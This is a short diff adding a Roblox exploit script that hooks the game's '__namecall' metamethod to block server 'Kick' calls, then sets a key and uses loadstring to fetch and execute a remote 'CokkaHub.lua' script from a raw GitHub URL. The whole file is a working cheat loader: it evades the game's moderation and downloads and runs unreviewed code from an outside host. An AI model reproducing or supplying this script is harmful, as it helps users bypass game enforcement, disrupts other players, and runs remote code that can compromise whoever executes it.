@@ -1,0 +1,11 @@
+local oldnamecall = nil
+oldnamecall = hookmetamethod(game, "__namecall", newcclosure(function(Self, ...)
+    if (not checkcaller()) and (getnamecallmethod() == "Kick") then
+       return nil
+    end
+    return(oldnamecall(Self, ...))
+end))
+
+
+_G.Key = "F0GXwMCyeV"
+loadstring(game:HttpGet"https://raw.githubusercontent.com/UserDevEthical/Loadstring/main/CokkaHub.lua")()
